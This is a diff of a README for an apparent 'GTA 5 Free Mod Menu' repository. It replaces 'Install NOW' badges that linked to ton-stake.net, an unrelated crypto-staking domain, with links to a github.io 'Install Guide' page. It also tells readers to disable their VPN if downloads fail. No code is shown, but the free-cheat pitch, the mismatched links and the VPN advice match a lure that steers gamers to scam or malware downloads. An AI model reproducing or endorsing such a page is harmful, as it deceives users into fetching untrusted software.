@@ -5,9 +5,10 @@
 
 **Description**: Unlock the full potential of GTA 5 with the **GTA 5 Free Mod Menu**, offering free gaming enhancements in 2025! This repository provides exclusive tutorials, resources, and tips to explore mod features like custom vehicles and gameplay tweaks. Download your free mod menu and join our vibrant community of GTA fans!  
 
-[![Install GTA 5 Mod Menu](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://gta5-free-mod-menu.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
 
 ## 📋 Installation Guide  
 
@@ -28,9 +29,9 @@ Enhance your GTA 5 experience with these simple steps to set up the Free Mod Men
 5. **Access Problems?** 🌐  
    If the package access fails, try disabling your VPN or switching browsers (e.g., Chrome, Firefox).  
 
-[![Install GTA 5 Mod Menu](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
+<a href="https://gta5-free-mod-menu.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ## 💡 Why Choose GTA 5 Free Mod Menu  
 
